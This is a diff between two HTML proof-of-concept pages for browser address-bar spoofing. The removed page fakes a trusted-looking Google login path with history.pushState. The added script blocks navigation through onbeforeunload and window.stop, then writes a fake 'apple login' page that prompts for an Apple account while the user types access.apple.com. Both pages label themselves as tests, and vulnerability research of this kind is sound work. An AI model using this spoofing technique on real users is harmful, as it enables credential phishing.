@@ -1,116 +1,24 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Address Bar Origin Confusion PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-body{
-  font-family:system-ui,-apple-system,sans-serif;
-  text-align:center;
-  background:#f5f5f7;
+<h1 id="msg">Next,type access.apple.com in the address bar.</h1>
+<h1 id="spoof"></h1>
+<script type="text/javascript">
+spoof.style.display = 'none';
+var done = 0;
+var got = 0;
+onbeforeunload = function(ev) {
+  done = 1;
+  return false;
 }
-
-button{
-  margin:20px;
-  padding:12px 18px;
-  border:0;
-  border-radius:12px;
-  background:#007aff;
-  color:white;
-  font-size:16px;
+onmousemove = function() {
+  stop();
+  if (done && !got) {
+    msg.style.display = 'none';
+    got = "1000";
+    if (got) {
+      document.write("<title>apple login</title><h1>This is not apple.com!!!</h1><scri"+"pt>onbeforeunload=function(){/*while(1){}*/};document.write('<input id=\\\'log\\\'>');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com');</scrip"+"t>");
+      spoof.style.display = 'block';
+      log.value = got;
+      
+    }
+  }
 }
-
-#panel{
-  display:none;
-  margin:40px auto;
-  padding:20px;
-  max-width:400px;
-  background:white;
-  border-radius:16px;
-}
-
-.info{
-  margin:15px;
-  word-break:break-all;
-}
-
-.warning{
-  color:#b00020;
-  margin-top:20px;
-}
-</style>
-</head>
-
-<body>
-
-<h2>Address Bar Origin Confusion PoC</h2>
-
-<p>history.pushState() URL manipulation</p>
-
-<button id="start">
-Start PoC
-</button>
-
-<div id="panel">
-
-<h3>Trusted Looking Path</h3>
-
-<div class="info">
-URL:
-<br>
-<span id="url"></span>
-</div>
-
-<div class="info">
-Origin:
-<br>
-<span id="origin"></span>
-</div>
-
-<div class="warning">
-⚠ This page is NOT google.com
-</div>
-
-<button id="navigate">
-Navigate
-</button>
-
-</div>
-
-
-<script>
-
-const panel = document.getElementById("panel");
-const url = document.getElementById("url");
-const origin = document.getElementById("origin");
-
-
-document.getElementById("start").onclick = () => {
-
-  history.pushState(
-    {},
-    "",
-    "/trusted/google/login"
-  );
-
-  panel.style.display = "block";
-
-  url.textContent = location.href;
-  origin.textContent = location.origin;
-
-};
-
-
-document.getElementById("navigate").onclick = () => {
-
-  location.href =
-    "https://google.com:9090";
-
-};
-
 </script>
-
-</body>
-</html>
